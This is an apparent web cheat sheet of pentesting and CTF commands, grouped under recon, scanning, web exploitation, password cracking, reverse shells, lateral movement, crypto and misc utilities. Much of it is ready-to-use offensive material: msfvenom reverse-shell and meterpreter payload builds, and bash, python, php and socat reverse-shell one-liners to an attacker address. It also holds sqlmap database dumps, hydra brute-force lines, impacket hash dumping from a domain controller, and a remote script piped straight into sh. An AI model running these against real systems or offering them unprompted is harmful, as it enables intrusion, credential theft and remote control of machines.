cybersecurity tools cheatsheet

Quick commands for the most common pentesting and CTF tools. Bookmark it.

Recon Scanning Web Exploitation Password Shells Lateral Crypto Misc

🔍 Reconnaissance

nmap — Basic scan
Fast port scan on target
nmap -sS -sV -O <target>
nmap — All ports + scripts
Full TCP scan with default scripts
nmap -p- -sC -sV -T4 <target>
nmap — UDP scan
Common UDP ports
nmap -sU --top-ports 100 <target>
nmap — Output to all formats
Normal, XML, grepable
nmap -oA scan_output <target>
whois
Domain registration info
whois <domain>
dnsrecon
DNS enumeration
dnsrecon -d <domain>
dig — TXT records
Check SPF, DKIM, DMARC
dig <domain> TXT

📡 Scanning & Enumeration

gobuster — Directory bruteforce
Common web directories
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
gobuster — Subdomains
DNS subdomain enumeration
gobuster dns -d <domain> -w <wordlist>
ffuf — Fast web fuzzing
Directory busting with filters
ffuf -u <url>/FUZZ -w <wordlist> -mc 200,301,302
ffuf — Recursive
Deep directory bruteforce
ffuf -recursion -recursion-depth 3 -u <url>/FUZZ -w <wordlist>
nikto
Web server vulnerability scan
nikto -h <target>
whatweb
CMS, framework, version detection
whatweb <url>
wpscan
WordPress vulnerability scanner
wpscan --url <url> --enumerate

🌐 Web Exploitation

sqlmap — Basic
Auto-detect and exploit SQLi
sqlmap -u "<url>?param=1" --batch
sqlmap — Dump database
Extract all tables
sqlmap -u "<url>?param=1" --dump --batch
curl — Basic request
View response headers and body
curl -iv <url>
curl — POST with data
Send form/data to endpoint
curl -X POST -d "user=admin&pass=test" <url>
curl — Custom headers
Add auth cookies, user-agent
curl -H "Authorization: Bearer <token>" -H "User-Agent: Mozilla/5.0" <url>

💥 Exploitation Frameworks

msfconsole — Search + Use
Find and load an exploit
msfconsole
search <cve or name>
use <module>
show options
set RHOSTS <target>
run
msfvenom — Reverse shell payload
Generate staged payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o payload.elf
msfvenom — Windows meterpreter
Meterpreter reverse TCP
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe
msfvenom — Web shell
PHP reverse shell
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -o shell.php
searchsploit
Search Exploit-DB locally
searchsploit <keyword>

🔑 Password Cracking

hashcat — Identify hash
Auto-detect hash type
hashcat --identify hash.txt
hashcat — Dictionary attack
MD5 with rockyou
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat — NTLM
Windows NTLM hash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat — bcrypt
Slow hash, low speed expected
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
john — Unshadow
Combine passwd + shadow for cracking
unshadow passwd shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hydra — SSH brute force
SSH password attack
hydra -l <user> -P <wordlist> <target> ssh
hydra — Web form
POST login bruteforce
hydra -l <user> -P <wordlist> <target> http-post-form "/path:user=^USER^&pass=^PASS^:F=incorrect"

🐚 Reverse Shells & Listeners

netcat — Listener
Basic reverse shell listener
nc -lvnp <port>
Bash reverse shell
One-liner for Linux targets
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
Python reverse shell
Python3 one-liner
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
PHP reverse shell
Web shell via PHP
php -r '$s=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
Python HTTP server
Quick file transfer server
python3 -m http.server <port>
socat — Full TTY
Fully interactive TTY shell
# listener:
socat file:`tty`,raw,echo=0 TCP-LISTEN:<port>
# target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ip>:<port>
Upgrade shell — Python
PTY upgrade after netcat
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
reset; export TERM=xterm

🔄 Lateral Movement

impacket — psexec
Execute as admin on Windows
impacket-psexec <domain>/<user>:<pass>@<target>
impacket — wmiexec
WMI execution (subtle)
impacket-wmiexec <domain>/<user>:<pass>@<target>
impacket — secretsdump
Dump hashes from DC
impacket-secretsdump <domain>/<user>:<pass>@<target>
evil-winrm
WinRM shell session
evil-winrm -i <target> -u <user> -p <pass>
smbclient
List SMB shares anonymously
smbclient -L //<target> -N
ssh — Tunnel
Local port forward through SSH
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<jump_host>

🔐 Cryptography & Encoding

openssl — Generate RSA key pair
2048-bit private/public
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout > public.pem
openssl — Self-signed cert
For HTTPS testing
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
Base64 — Encode/Decode
Shell one-liners
echo -n "<text>" | base64    # encode
echo "<base64>" | base64 -d  # decode
xxd — Hex dump / unhex
Binary to hex and back
xxd <file>              # hex dump
xxd -r -p <hex.txt>      # hex to binary

🧰 Misc Utilities

linpeas — Linux privesc
Auto-enumeration script for Linux
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
winpeas — Windows privesc
Auto-enumeration for Windows
curl -L -o winpeas.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winpeasx64.exe
.\winpeas.exe
steghide
Extract hidden data from image
steghide extract -sf image.jpg
binwalk
Extract files from firmware/binaries
binwalk --dd=".*" firmware.bin
strings
Extract readable text from binary
strings <file> | grep -i "flag\|password\|secret"
